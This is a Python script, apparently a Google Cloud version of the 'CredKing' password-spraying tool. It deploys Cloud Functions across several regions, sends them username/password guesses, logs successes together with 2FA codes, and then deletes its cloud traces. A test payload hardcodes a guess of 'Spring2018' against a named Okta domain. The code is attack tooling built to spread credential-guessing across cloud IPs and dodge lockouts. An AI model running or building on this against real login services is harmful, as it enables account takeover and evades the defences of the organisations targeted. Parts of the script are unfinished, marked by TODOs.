#!/usr/bin/python3
import requests
import json
from googleapiclient.discovery import build
from google.oauth2 import service_account
from google.cloud import storage
from time import time
from pprint import pprint
from threading import Lock, Thread
lock = Lock()
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import re, argparse, importlib
# TODO: Pass in service account file as an argument
_service_account_email = ""
credentials = {'accounts': []}

def main(args,pargs):
    global start_time, end_time, time_lapse

    thread_count = args.threads
    plugin = args.plugin
    username_file = args.userfile
    password_file = args.passwordfile
    sa_file = args.sa_creds_file
    useragent_file = args.useragentfile

    pluginargs = {}
    for i in range(0, len(pargs) - 1):
        key = pargs[i].replace("--", "")
        pluginargs[key] = pargs[i + 1]

    start_time = datetime.datetime.utcnow()
    log_entry('Execution started at: {}'.format(start_time))

    # Check with plugin to make sure it has the data that it needs
    validator = importlib.import_module('plugins.{}'.format(plugin))
    if getattr(validator, "validate", None) is not None:
        valid, errormsg = validator.validate(pluginargs)
        if not valid:
            log_entry(errormsg)
            return
    else:
        log_entry("No validate function found for plugin: {}".format(plugin))


    #sa_file = 'service-account.json'
    credentials = service_account.Credentials.from_service_account_file(sa_file)
    _service_account_email = credentials.service_account_email

    service = build('cloudfunctions', 'v1', credentials=credentials)
    storage_service = build('storage', 'v1', credentials=credentials)

    # Uploading Code

    # Creating a bucket
    bucket_name = f"credking_{next(generate_random())}"
    body = {'name': bucket_name}
    log_entry(storage_service.buckets().insert(project=credentials.project_id, predefinedAcl="projectPrivate",
                                               body=body).execute())

    # Uploading a file from a created bucket
    storage_client = storage.Client(project=credentials.project_id, credentials=credentials)
    bucket = storage_client.bucket(bucket_name)
    source_url = create_bucket(bucket,'okta')

    locations = service.projects().locations()
    functions = create_functions(locations,credentials.project_id,source_url,thread_count)

    # Call Function
    data = {"username": "test.test2", "password": "Spring2018", "useragent": "test",
            "args": {"oktadomain": "cardinalb2e.okta.com"}}
    body = {"data": json.dumps(data)}
    # log_entry(service.projects().locations().functions().call(name=function_name,body=body).execute())
    for function_name in functions:
        invoke_function(locations.functions(), function_name, body)
        delete_function(locations.functions(), function_name)
    delete_bucket(bucket)
    delete_zip()

def create_functions(locations,project_id,source_url,thread_count):
    # Get Locations
    locations_response = locations.list(name=f'projects/{project_id}').execute()
    location_names = ["us-central1","us-east1","us-east4","europe-west1","asia-east2"]
    #log_entry(len(locations_response['locations']))
    log_entry(len(location_names))
    # print(json.dumps(locations,indent=2))

    if thread_count > len(location_names):
        thread_count = len(location_names)
    #elif thread_count > len(credentials['accounts']):
    #    thread_count = len(credentials['accounts'])

    function = locations.functions()
    function_names = []
    for x in range(0,thread_count):
        function_names.append(create_function(function, project_id, source_url, location_names[x]))
    return function_names


def log_entry(entry):
    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
    print(f'[{ts}] {entry}')

def generate_random():
    seed = random.getrandbits(32)
    while True:
        yield seed
        seed += 1


def create_zip(plugin):
    plugin_path = 'plugins/{}/'.format(plugin)
    random_name = next(generate_random())
    build_zip = 'build/{}_{}.zip'.format(plugin, random_name)

    with lock:
        log_entry('Creating build deployment for plugin: {}'.format(plugin))
        shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)

    return build_zip

def create_bucket(bucket,plugin):
    path = create_zip(plugin)
    blob = bucket.blob('test.zip')
    blob.upload_from_filename(path)
    object_url = f'gs://{blob.bucket.name}/{blob.name}'
    return object_url

def create_function(function, project_id, source_url,location):
    # Calling the create function command
    log_entry(location)
    f_name = f'credking-function-{next(generate_random())}'
    # function_name = f"{locations_response['locations'][x]['name']}/functions/{f_name}"
    location_name = f"projects/{project_id}/locations/{location}"
    function_name = f"{location_name}/functions/{f_name}"
    log_entry(function_name)
    log_entry(f"Creating Function: {function_name}")

    # Create Function
    body =  {
            "name" : function_name,
            "availableMemoryMb": 128,
            "entryPoint": "lambda_handler",
            "description": "CredKing Function",
            "timeout": "60s",
            "runtime": "python37",
            "ingressSettings": "ALLOW_ALL",
            "maxInstances": 1,
            "sourceArchiveUrl": source_url,
            "httpsTrigger": {},
            "vpcConnector": "",
            "serviceAccountEmail": _service_account_email
            }
    #function = service.projects().locations().functions()
    function_resp = function.create(location=location_name,body=body).execute()
    log_entry(f"Function Resp: {function_resp}")

    # TODO: Move the check out of this when threading
    # Get Status of the function and make sure that it is active
    while True:
        sleep = 5
        status = function.get(name=function_name).execute()
        if status['status'] == 'ACTIVE':
            break
        else:
            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
            time.sleep(sleep)
    log_entry(f"Created Function: {function_name}")
    return function_name

def invoke_function(function,function_name,payload):
    response = function.call(name=function_name, body=payload).execute()
    return_payload = json.loads(response['result'])

    user, password = return_payload['username'], return_payload['password']
    code_2fa = return_payload['code']
    if return_payload['success']:
        # TODO: Add this back in when iterating
        #clear_credentials(user, password)
        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
    else:
        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))

def delete_function(function,function_name):
    # Delete Function
    log_entry(function.delete(name=function_name).execute())

def delete_bucket(bucket):
    # Delete Code
    blob = bucket.blob('test.zip')
    blob.delete()
    bucket.delete()

def delete_zip():
    # Delete Zip
    file_list = [ f for f in os.listdir('build') if f.endswith(".zip") ]
    for f in file_list:
        os.remove(os.path.join('build', f))
        log_entry(f"Removing file {f}")

# TODO: Parameterize above

# TODO: Thread the above code

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--plugin', help='spraying plugin', required=True)
    parser.add_argument('--threads', help='thread count (default: 1)',
                        type=int, default=1)
    parser.add_argument('--userfile', help='username file', required=True)
    parser.add_argument('--passwordfile', help='password file', required=True)
    parser.add_argument('--useragentfile', help='useragent file', required=False)
    parser.add_argument('--access_key', help='aws access key', required=False)
    parser.add_argument('--secret_access_key', help='aws secret access key', required=False)
    parser.add_argument('--sa_creds_file', help="GCP Json Keys", required=False)
    args,pluginargs = parser.parse_known_args()
    main(args,pluginargs)
